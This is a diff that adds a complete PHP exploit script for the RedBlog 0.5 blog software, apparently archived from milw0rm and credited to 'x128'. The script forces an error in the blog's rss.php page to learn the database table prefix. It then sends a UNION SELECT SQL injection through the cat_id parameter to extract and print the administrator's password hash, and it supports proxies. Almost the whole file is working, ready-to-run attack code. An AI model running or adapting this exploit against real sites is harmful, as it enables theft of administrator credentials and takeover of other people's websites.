@@ -1,0 +1,79 @@
+<?
+error_reporting(E_ERROR);
+
+function xss_init()
+{
+    if (!extension_loaded('php_curl'))
+    {
+       if (!dl('curl.so') and !dl('php_curl.so') and !dl('php_curl.dll'))
+       die ("oo error - cannot load curl extension!");
+    }
+}
+
+function xss_header()
+{
+    echo "\noooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo";
+    echo "                                  oo    ooooooo     ooooooo\n";
+    echo "                    oooo   oooo o888  o88     888 o888   888o\n";
+    echo "                      888o888    888        o888   888888888\n";
+    echo "                      o88888o    888     o888   o 888o   o888\n";
+    echo "                    o88o   o88o o888o o8888oooo88   88ooo88\n";
+    echo "ooooooooooooooooooooooooooooo redblog 0.5 exploit ooooooooooooooooooooooooooooo\n";
+    echo "oo usage          $ php redblog-05-exploit.php [url]\n";
+    echo "oo proxy support  $ php redblog-05-exploit.php [url] [proxy]:[port]\n";
+    echo "oo example        $ php redblog-05-exploit.php http://localhost\n";
+    echo "oo print the password of the administrator\n\n";
+}
+
+function xss_bottom()
+{
+    echo "\noo discover : x128 - alexander wilhelm - 09/03/2006\n";
+    echo "oo contact  : exploit <at> x128.net                    oo website : www.x128.net";
+}
+
+function xss_exploit()
+{
+    $xss_target = $_SERVER['argv'][1] . "/modules/blog/rss.php";
+    $xss_http_get = "?cat_id=x128";
+
+    $xss_connection = curl_init();
+
+    if ($_SERVER['argv'][2])
+    {
+        curl_setopt($xss_connection, CURLOPT_TIMEOUT, 8);
+        curl_setopt($xss_connection, CURLOPT_PROXY, $_SERVER['argv'][2]);
+    }
+
+    curl_setopt ($xss_connection, CURLOPT_URL, $xss_target . $xss_http_get);
+    curl_setopt ($xss_connection, CURLOPT_HEADER, 0);
+    curl_setopt ($xss_connection, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt ($xss_connection, CURLOPT_USERAGENT, 'x128');
+
+    $xss_source = curl_exec($xss_connection) or die("oo error - cannot connect!\n");
+    
+    preg_match("/FROM ([0-9a-zA-Z_]*)posts/", $xss_source, $xss_prefix);
+
+    $xss_http_get = "?cat_id=" . urlencode("0 UNION SELECT 1,config_value,1,1,1,1,1,1 FROM " . $xss_prefix[1] . "general_config/*");
+    $xss_source = curl_exec($xss_connection) or die("oo error - cannot connect!\n");
+
+    curl_setopt ($xss_connection, CURLOPT_URL, $xss_target . $xss_http_get);
+
+    $xss_source = curl_exec($xss_connection) or die("oo error - cannot connect!\n");
+    preg_match("/<title>([0-9a-f]{32})<\/title>/", $xss_source, $xss_output);
+    
+    if ($xss_output[0])
+    {
+        echo "oo password       " . $xss_output[1] . "\n\n";
+        echo "oo dafaced ...\n";
+    }
+
+    curl_close ($xss_connection); 
+}
+
+xss_init();
+xss_header();
+xss_exploit();
+xss_bottom();
+?>
+
+# milw0rm.com [2006-03-08]
